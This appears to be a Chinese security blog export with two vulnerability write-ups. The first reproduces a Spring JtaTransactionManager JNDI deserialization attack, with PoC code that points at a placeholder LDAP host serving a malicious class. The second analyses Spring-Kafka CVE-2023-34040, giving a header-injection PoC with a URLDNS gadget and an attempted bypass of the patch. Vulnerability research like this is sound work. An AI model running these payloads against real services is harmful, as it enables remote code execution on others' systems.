<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png" alt="image-20200414103027298"></p>
<p>org.springframework.transaction.jta.JtaTransactionManager#lookupUserTransaction</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png" alt="image-20200414103115405"></p>
<p>当前代码是IDEA反编译得来的，下载源码后，该方法介绍为</p>
<blockquote>
<p>Look up the JTA UserTransaction in JNDI via the configured name.</p>
</blockquote>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png" alt="image-20200414103252512"></p>
<p>继续跟进也会发现其实就是封装了JNDI的操作</p>
<p>org.springframework.jndi.JndiTemplate#lookup(java.lang.String)</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png" alt="image-20200414104000058"></p>
<p>org.springframework.jndi.JndiTemplate#createInitialContext</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png" alt="image-20200414104026444"></p>
<p>而lookup的参数userTransactionName也是可控的，那么漏洞就很显然了</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先编译恶意类放于WEB服务中</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png" alt="image-20200414105118218"></p>
<p>借助marshalsec启动ldap服务并设置恶意类地址</p>
<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png" alt="image-20200414105225641"></p>
<p>最后模拟漏洞触发场景，构造恶意类并反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">&quot;ldap://x.x.x.x:6666/xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        unserialize(serialize(jtaTransactionManager));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.open-open.com/news/view/1225d07">Spring framework deserialization RCE漏洞分析以及利用</a></p>
]]></content>
      <tags>
        <tag>Java反序列化漏洞</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Kafka 反序列化漏洞(CVE-2023-34040)分析</title>
    <url>/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>当受影响版本的 Spring-Kafka Consumer 未对Record配置 ErrorHandlingDeserializer 并设置 checkDeserExWhenKeyNull 或 checkDeserExWhenValueNull 为 true 且攻击者可以发布 Kafka 消息时，将会存在Java反序列化漏洞。只需发布 key 或 value 为 null 的消息，且在相应的header中放入序列化数据，便可以任意反序列化</p>
<span id="more"></span>



<h2 id="Spring-Kafka"><a href="#Spring-Kafka" class="headerlink" title="Spring-Kafka"></a>Spring-Kafka</h2><p>Spring-Kafka 、 kafka-clients 和 Spring Boot 的版本对应关系参考官方文档：  <a href="https://spring.io/projects/spring-kafka#overview">https://spring.io/projects/spring-kafka#overview</a></p>
<p>Kafka 可以使用 ZooKeeper 或以 KRaft 模式启动，这里用 Docker 以 KRaft 模式启动Kafka：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -d --name kafka-server --hostname localhost -p 9092:9092 \</span><br><span class="line">    -e KAFKA_CFG_NODE_ID=0 \</span><br><span class="line">    -e KAFKA_CFG_PROCESS_ROLES=controller,broker \</span><br><span class="line">    -e KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \</span><br><span class="line">    -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \</span><br><span class="line">    -e KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=0@localhost:9093 \</span><br><span class="line">    -e KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER \</span><br><span class="line">    bitnami/kafka:3.5.1</span><br></pre></td></tr></table></figure>



<p>IDEA中创建maven项目，添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>参考<a href="https://docs.spring.io/spring-kafka/docs/2.9.10/reference/html/#getting-started">https://docs.spring.io/spring-kafka/docs/2.9.10/reference/html/#getting-started</a> 写出消费者和生产者的Demo：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">bootstrap-servers:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9092</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@KafkaListener(id = &quot;myId&quot;, topics = &quot;myTopic&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">(String in)</span> &#123;</span><br><span class="line">        System.out.println(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;Object, Object&gt; template;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/send&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.template.send(<span class="string">&quot;myTopic&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>参考官方公告： <a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a> ，漏洞影响组件及版本为 Spring for Apache Kafka  2.8.1 to 2.9.10、3.0.0 to 3.0.9，利用条件如下：</p>
<ul>
<li>没有为 Record 的 key 或 value 设置 ErrorHandlingDeserializer</li>
<li>将 checkDeserExWhenKeyNull 或  checkDeserExWhenValueNull 设置为 true</li>
<li>允许不受信任的源发布Kafka主题</li>
</ul>
<p>漏洞在Consumer侧触发，修改Consumer，以设置 checkDeserExWhenKeyNull 和 checkDeserExWhenValueNull：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.consumer.ConsumerConfig;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.kafka.KafkaProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.DefaultKafkaConsumerFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.serialization.StringDeserializer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@KafkaListener(id = &quot;myId&quot;, topics = &quot;myTopic&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">(String in)</span> &#123;</span><br><span class="line">        System.out.println(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaProperties kafkaProperties;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; <span class="title function_">kafkaListenerContainerFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; props = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getBootstrapServers());</span><br><span class="line">        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);</span><br><span class="line">        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);</span><br><span class="line"></span><br><span class="line">        ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory = <span class="keyword">new</span> <span class="title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();</span><br><span class="line">        factory.setConsumerFactory(<span class="keyword">new</span> <span class="title class_">DefaultKafkaConsumerFactory</span>&lt;&gt;(props));</span><br><span class="line">        factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="literal">true</span>);</span><br><span class="line">        factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>同时修改Producer，以自定义key、value和header</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;Object, Object&gt; template;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/send&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;Object,Object&gt;(<span class="string">&quot;myTopic&quot;</span>,<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.template.send(producerRecord);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>由 checkDeserExWhenKeyNull 和  checkDeserExWhenValueNull 名称可知当这两项配置为true，并且Record的key或value为null的时候会触发反序列化，所以以上代码中，我设置了value部分为null</p>
<p>在<code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code>设置断点，并用Producer发送消息</p>
<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928181513185.png" alt="image-20230928181513185"></p>
<p>当value为null时，会取header中的<code>springDeserializerExceptionValue</code>，接着修改Producer的代码，添加header，再次发送消息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">    ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;Object,Object&gt;(<span class="string">&quot;myTopic&quot;</span>,<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    producerRecord.headers().add(<span class="string">&quot;springDeserializerExceptionValue&quot;</span>, <span class="string">&quot;leixiao&quot;</span>.getBytes());</span><br><span class="line">    <span class="built_in">this</span>.template.send(producerRecord);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928181907059.png" alt="image-20230928181907059"></p>
<p>最终会在<code>org.springframework.kafka.listener.ListenerUtils#byteArrayToDeserializationException</code>进行反序列化</p>
<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928181948453.png" alt="image-20230928181948453"></p>
<p>这里使用了<code>resolveClass</code>对反序列化的类进行了限制，限制类名只能是<code>org.springframework.kafka.support.serializer.DeserializationException</code>，但是通过<code>this.first</code>字段实现只检查一次反序列化类名，所以该类如果有其他类型的字段，或者嵌套着其他对象的序列化数据，那仍然是可以正常反序列化的</p>
<p>为了构造顶层类为<code>org.springframework.kafka.support.serializer.DeserializationException</code>并且嵌套着其他对象的序列化数据，我们可以先建一个类名为<code>xrg.springframework.kafka.support.serializer.DeserializationException</code>的类，然后在其字段里自由构造，最后直接修改序列化数据中的类名，如下POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xrg.springframework.kafka.support.serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationException</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8280022391259546509L</span>;</span><br><span class="line">    <span class="keyword">private</span> Object foo;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DeserializationException</span><span class="params">(Object foo)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.foo = foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;Object, Object&gt; template;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/send&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;Object,Object&gt;(<span class="string">&quot;myTopic&quot;</span>,<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        producerRecord.headers().add(<span class="string">&quot;springDeserializerExceptionValue&quot;</span>, getPOC());</span><br><span class="line">        <span class="built_in">this</span>.template.send(producerRecord);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPOC() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">urldns</span> <span class="operator">=</span> getURLDNS(<span class="string">&quot;http://leixiao.cff03fad.dnslog.store&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">xrg</span>.springframework.kafka.support.serializer.DeserializationException(urldns);</span><br><span class="line">        <span class="type">byte</span>[] data = serialize(o);</span><br><span class="line">        data[<span class="number">8</span>] = <span class="string">&quot;o&quot;</span>.getBytes()[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getURLDNS</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        HashMap&lt;URL,String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        hashMap.put(u, url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(u,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream  objectOutputStream= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里构造了URLDNS的POC，当然如果存在其他Gadget，都是可以按这个方法构造的</p>
<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928202623507.png" alt="image-20230928202623507"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>把spring-kafka 版本换到 2.9.11，重新运行一下POC，报错<code>...[Payload value must not be empty]...</code>，可能是新版不允许value为null的情况了？试着让key为null：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;Object,Object&gt;(<span class="string">&quot;myTopic&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">producerRecord.headers().add(<span class="string">&quot;springDeserializerExceptionKey&quot;</span>, getPOC());</span><br></pre></td></tr></table></figure>

<p>运行POC，此时代码也无法执行到<code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code>了，而且控制台提示如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARN 62418 --- [     myId-0-C-1] o.s.k.l.KafkaMessageListenerContainer    : Foreign deserialization exception header in (myTopic-0@10) ignored; possible attack?</span><br><span class="line">value</span><br></pre></td></tr></table></figure>

<p>具体逻辑在<code>org.springframework.kafka.support.serializer.SerializationUtils#getExceptionFromHeader</code></p>
<p><img src="/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928210501777.png" alt="image-20230928210501777"></p>
<p>可见，只有当header为<code>DeserializationExceptionHeader</code>才能继续执行，但是我们的header类型是<code>RecordHeader</code>，我想过在Producer中反射修改header的类型去绕过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; exceptionHeaderClass = Class.forName(<span class="string">&quot;org.springframework.kafka.support.serializer.DeserializationExceptionHeader&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; exceptioHeaderConstructor =  exceptionHeaderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">exceptioHeaderConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Header</span> <span class="variable">exceptionHeader</span> <span class="operator">=</span> (Header) exceptioHeaderConstructor.newInstance(<span class="string">&quot;springDeserializerExceptionKey&quot;</span>, getPOC());</span><br><span class="line">Header[] headers = <span class="keyword">new</span> <span class="title class_">Header</span>[]&#123;exceptionHeader&#125;;</span><br><span class="line"></span><br><span class="line">ProducerRecord&lt;Object,Object&gt; producerRecord = <span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;Object,Object&gt;(<span class="string">&quot;myTopic&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">headersField</span> <span class="operator">=</span>producerRecord.getClass().getDeclaredField(<span class="string">&quot;headers&quot;</span>);</span><br><span class="line">headersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifersField.setInt(headersField, headersField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">headersField.set(producerRecord,<span class="keyword">new</span> <span class="title class_">RecordHeaders</span>(headers));</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.template.send(producerRecord);</span><br></pre></td></tr></table></figure>

